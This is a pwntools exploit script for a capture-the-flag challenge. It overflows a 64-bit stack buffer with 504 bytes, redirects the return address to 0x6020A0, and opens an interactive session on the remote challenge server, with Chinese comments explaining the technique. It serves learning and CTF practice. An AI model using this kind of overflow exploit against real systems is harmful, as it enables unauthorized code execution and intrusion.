from pwn import *

context(arch = 'amd64', os = 'linux', log_level = 'debug')

io = remote('pwn.challenge.ctf.show', 28138)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# 等待提示信息
io.recvuntil('Haha,It has reduced you a lot of difficulty!')

# 构造payload，填充504个'a'，然后跳转到0x6020A0地址
# 0x6020A0可能是一个包含shellcode或backdoor的地址
payload = b'a' * 504 + p64(0x6020A0)
io.sendline(payload)
io.interactive()

"""
【知识点讲解】
1. 题目类型：stack overflow - 64位栈溢出
2. 核心原理：
   - 利用栈溢出漏洞覆盖返回地址
   - 直接跳转到指定地址0x6020A0
3. 关键计算：
   - 504：计算到返回地址的偏移量
   - 0x6020A0：目标跳转地址，可能是包含shellcode或backdoor的位置
4. 执行流程：
   - 构造payload，填充垃圾数据到返回地址
   - 覆盖返回地址为0x6020A0
   - 程序执行ret指令时跳转到目标地址
5. 技术要点：
   - 64位程序的栈溢出利用
   - 准确计算偏移量
   - 跳转到指定地址执行代码
"""
